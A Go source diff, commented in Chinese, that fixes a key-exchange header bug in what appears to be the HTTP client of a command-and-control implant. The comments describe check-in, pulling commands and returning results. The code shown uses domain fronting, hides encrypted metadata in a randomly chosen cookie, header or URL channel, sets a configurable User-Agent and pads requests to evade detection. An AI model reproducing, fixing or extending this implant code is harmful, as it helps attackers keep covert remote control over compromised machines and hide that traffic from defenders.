@@ -136,6 +136,14 @@ func applyFrontHost(req *http.Request) {
 //
 // 服务端从三通道统一提取后裁 prepend 还原。
 func (s *HTTPClient) applyMetadata(req *http.Request) {
+	// KX 头必须与元数据**同生共死**：服务端对每个 HTTP 请求独立解析密钥
+	// （HTTP 无连接状态），所以凡是带 MetaInfo 的请求都必须同时带公钥，
+	// 否则服务端会回落到静态密钥，而 MetaInfo 是用派生密钥加密的 → 解不开。
+	//
+	// 放在这里而不是各调用点，是因为漏一处的后果极隐蔽：上线能成功
+	// （首包带对了），但之后拉命令/回结果全部失效。这个 bug 真实发生过。
+	s.applyKxHeader(req)
+
 	channel := config.MetadataChannel()
 	if channel == "auto" {
 		channel = []string{"cookie", "header", "url"}[rand.Intn(3)]
@@ -176,7 +184,7 @@ func (s *HTTPClient) applyRequestPadding(req *http.Request) {
 // 只在 Connect 期间使用：FirstBlood 完成后服务端已按 uid 注册会话密钥，
 // 之后再带这个头没有意义（也会让每个请求多一个可变字段）。
 
-// applyKxHeader 把临时公钥放进请求头（握手后的请求都带，直到 FirstBlood 完成）
+// applyKxHeader 把临时公钥放进请求头。握手成功后**每个**带元数据的请求都要带 —— 服务端按请求独立解析密钥。
 func (s *HTTPClient) applyKxHeader(req *http.Request) {
 	if s.kxPub != "" {
 		req.Header.Set(encrypt.KxHeaderName, s.kxPub)
@@ -243,7 +251,6 @@ func (s *HTTPClient) getRaw() error {
 	req.Header.Set("User-Agent", config.UserAgent())
 	applyFrontHost(req)
 	s.applyMetadata(req)
-	s.applyKxHeader(req)
 	s.applyRequestPadding(req)
 	resp, err := s.client.Do(req)
 	if err != nil {
